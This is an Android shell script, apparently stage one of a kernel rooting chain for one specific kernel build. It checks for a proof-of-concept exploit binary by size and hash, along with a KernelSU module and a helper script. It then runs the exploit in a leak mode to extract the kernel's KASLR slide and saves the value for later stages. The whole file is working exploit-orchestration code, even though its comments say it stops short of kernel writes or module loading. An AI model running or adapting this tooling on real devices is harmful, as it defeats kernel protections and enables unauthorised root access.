#!/system/bin/sh
# Reclaimed-tool runner for PD2337 / 6.1.172.
# Stage 1 only: verify assets, run the existing poc_tmp_root in --leak mode,
# and extract the current boot KASLR slide. It deliberately does not insmod,
# write kernel memory, install userland, or kill processes.
D=/data/local/tmp
CH=$D/chan
POC=$D/poc_tmp_root
PROBE=$D/probe
RK=$D/rk.sh
LINK_KO=$D/ksu_final.ko
PATCHED_KO=$D/ksu_current.ko
LOG=$D/reclaimed_root.log
ADB_LOG=$D/reclaimed_runner.log

say() { echo "$*"; echo "$*" >> "$ADB_LOG" 2>/dev/null; }
fail() { say "!!!!! $*"; exit 1; }
ksu_loaded() { grep -q '^kernelsu ' /proc/modules 2>/dev/null; }

: > "$ADB_LOG" 2>/dev/null
say "=== reclaimed runner stage1 $(date '+%F %T' 2>/dev/null) ==="
say "kernel=$(uname -r) boot=$(cat /proc/sys/kernel/random/boot_id 2>/dev/null)"

case "$(uname -r)" in
  *6.1.172-android14-11-maybe-dirty*) ;;
  *) fail "wrong kernel, refusing to run" ;;
esac

ksu_loaded && { say "kernelsu already loaded"; exit 0; }
[ -x "$POC" ] || fail "missing executable $POC"
[ -x "$PROBE" ] || fail "missing executable $PROBE"
[ -f "$RK" ] || fail "missing $RK"
[ -s "$LINK_KO" ] || fail "missing base KO $LINK_KO"

AVAIL=$(grep '^MemAvailable:' /proc/meminfo 2>/dev/null | awk '{print $2}')
[ -n "$AVAIL" ] || AVAIL=0
[ "$AVAIL" -ge 2097152 ] || fail "MemAvailable below 2GB: ${AVAIL}KB"
say "MemAvailable=${AVAIL}KB"

POC_SIZE=$(wc -c < "$POC" 2>/dev/null | tr -d ' ')
[ "$POC_SIZE" = 9130848 ] || fail "poc size mismatch: $POC_SIZE"
POC_SHA=$(toybox sha256sum "$POC" 2>/dev/null | awk '{print $1}')
[ "$POC_SHA" = 369d2f78cf7d4692c165b0e888e3759d577de4ec831800e5705d997c727ea602 ] || fail "poc sha mismatch: $POC_SHA"
say "poc ok size=$POC_SIZE sha256=$POC_SHA"

mkdir -p "$CH" 2>/dev/null
chmod 777 "$CH" 2>/dev/null
rm -f "$CH/run" "$CH/busy" "$CH/out" "$CH/.up" "$CH/.stop" "$CH/.done" "$LOG" "$D/cmd.txt" 2>/dev/null

say "starting poc_tmp_root --leak (read-only slide leak)"
cd "$D" || exit 3
env -i PATH=/system/bin:/vendor/bin \
  POC_LOG="$LOG" POC_ROOTTEST=1 POC_DUMPMODS=1 \
  timeout -k 3 120 setsid ./poc_tmp_root --leak >/dev/null 2>&1 &

SLIDE=""
i=0
while [ $i -lt 120 ]; do
  SLIDE=$(grep -aoE 'SLIDE site slide=0x[0-9a-f]+|SLIDE=0x[0-9a-f]+|slide=0x[0-9a-f]+' "$LOG" 2>/dev/null | tail -1 | grep -o '0x[0-9a-f]*' | tail -1)
  [ -n "$SLIDE" ] && [ "$SLIDE" != "0x0" ] && break
  sleep 1
  i=$((i + 1))
done

if [ -z "$SLIDE" ] || [ "$SLIDE" = "0x0" ]; then
  say "slide leak failed; log tail follows"
  tail -30 "$LOG" 2>/dev/null
  fail "SLIDE_LEAK_FAILED"
fi

printf '%s' "$SLIDE" > "$D/current_slide.txt"
say "SLIDE=$SLIDE"
say "stage1 done; no kernel write, no insmod, no install, no kill"
